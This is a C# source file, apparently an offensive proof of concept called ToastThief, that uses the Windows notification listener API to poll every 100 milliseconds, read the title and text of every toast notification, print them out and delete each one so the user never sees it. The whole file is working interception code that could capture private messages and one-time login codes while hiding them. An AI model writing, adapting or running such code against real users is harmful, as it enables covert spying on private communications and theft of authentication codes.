using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using Windows.UI.Notifications.Management;
using Windows.UI.Notifications;

namespace ToastThief
{
    class ToastThief
    {
        static void Main(string[] args)
        {
            UserNotificationListener listener = GetListener();

            while (true)
            {
                StealNotifications(listener);
                Thread.Sleep(100);
            }
        }
        private static UserNotificationListener GetListener()
        {
            Console.WriteLine("Requesting access to notifications...");
            UserNotificationListener listener = UserNotificationListener.Current;
            var task = listener.RequestAccessAsync().AsTask();
            task.Wait();

            UserNotificationListenerAccessStatus access = task.Result;

            switch (access)
            {
                case UserNotificationListenerAccessStatus.Allowed:
                    Console.WriteLine("Access granted.");
                    break;
                case UserNotificationListenerAccessStatus.Denied:
                    Console.WriteLine("Permission denied!");
                    break;
                case UserNotificationListenerAccessStatus.Unspecified:
                    Console.WriteLine("Something went wrong?");
                    break;
            }

            return listener;
        }
        private static void StealNotifications(UserNotificationListener listener)
        {
            var task = listener.GetNotificationsAsync(NotificationKinds.Toast).AsTask();
            task.Wait();
            IReadOnlyList<UserNotification> toasts = task.Result;

            foreach (var toast in toasts)
            {
                NotificationBinding toastBinding = toast.Notification.Visual.GetBinding(KnownNotificationBindings.ToastGeneric);

                if (toastBinding != null)
                {
                    IReadOnlyList<AdaptiveNotificationText> textElements = toastBinding.GetTextElements();

                    string title = textElements.FirstOrDefault()?.Text;

                    string body = string.Join("\n", textElements.Skip(1).Select(t => t.Text));

                    FenceNotification(title, body);
                }

                listener.RemoveNotification(toast.Id);
            }
        }
        private static void FenceNotification(string title, string body)
        {
            Console.WriteLine(title);
            Console.WriteLine(body + "\n");
        }
    }
}

